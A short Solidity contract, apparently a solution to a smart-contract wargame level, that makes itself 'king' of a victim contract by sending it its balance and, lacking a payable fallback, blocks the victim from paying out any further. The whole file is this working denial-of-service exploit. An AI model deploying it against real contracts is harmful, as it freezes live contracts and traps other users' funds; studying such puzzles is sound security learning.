pragma solidity ^0.4.23;


// deploy with enough wei to pariticpate; run attack() function
// _victim becomes unable to accept any more transfers bc the attacking contract
// (now the king) doesn't have a payable fallback function
contract levelOneAttack {

    address public victim;

    constructor(address _victim) public payable {
        victim = _victim;
    }

    function attack() external {
        if(!victim.call.value(address(this).balance)()) revert();
    }
}
